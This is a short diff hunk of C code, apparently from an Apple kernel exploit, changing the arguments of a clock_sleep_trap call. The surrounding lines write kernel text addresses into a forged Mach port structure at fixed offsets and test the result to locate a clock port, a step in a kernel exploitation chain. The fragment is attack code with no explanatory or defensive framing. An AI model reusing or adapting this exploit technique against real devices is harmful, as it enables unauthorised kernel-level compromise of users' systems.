@@ -210,7 +210,7 @@ foundp:
             *(uint64_t*)(((uint64_t)fakeport) + 0x68) = textbase + i*0x100000 + 0x500000 + k;
             *(uint64_t*)(((uint64_t)fakeport) + 0xa0) = 0xff;
             
-            kern_return_t kret = clock_sleep_trap(foundport, 0x12345, 0, 0, NULL);
+            kern_return_t kret = clock_sleep_trap(foundport, 0, 0, 0, 0);
             
             if (kret != KERN_FAILURE) {
                 goto gotclock;
